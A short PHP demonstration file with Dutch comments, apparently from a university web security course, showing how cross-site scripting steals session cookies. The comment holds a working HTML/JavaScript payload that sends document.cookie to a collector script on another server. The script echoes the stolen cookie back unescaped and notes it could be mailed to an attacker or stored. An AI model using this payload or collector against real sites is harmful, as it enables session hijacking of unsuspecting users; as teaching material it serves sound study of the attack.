<?php /*
file: stealcookie.php
In een formulier waar je html mag typen kan ik de volgende javascript code
hebben verstopt: 

<a href="#" onclick="document.location='http://staff.science.uva.nl/~kaper/stealcookie.php?cookie='
 + document.cookie;">Klik hier!</a>

Deze code stuurt de sessie-cookie naar dit php-script, dat zich
op een andere server kan bevinden. Het staat bijvoorbeeld ook op
    http://staff.science.uva.nl/~kaper/stealcookie.php
D.i. niet op websec.
*/
?>
N.B. ik heb zojuist je sessie-cookie (<?php echo $_GET['cookie']; ?>) gestolen.

<?php
/* maar in plaats van zo'n vriendelijke echo kan ik het cookie ook
emailen naar mijn baas, de kraker, of opslaan in een database,
of... andere stoute dingen ermee doen! */
?>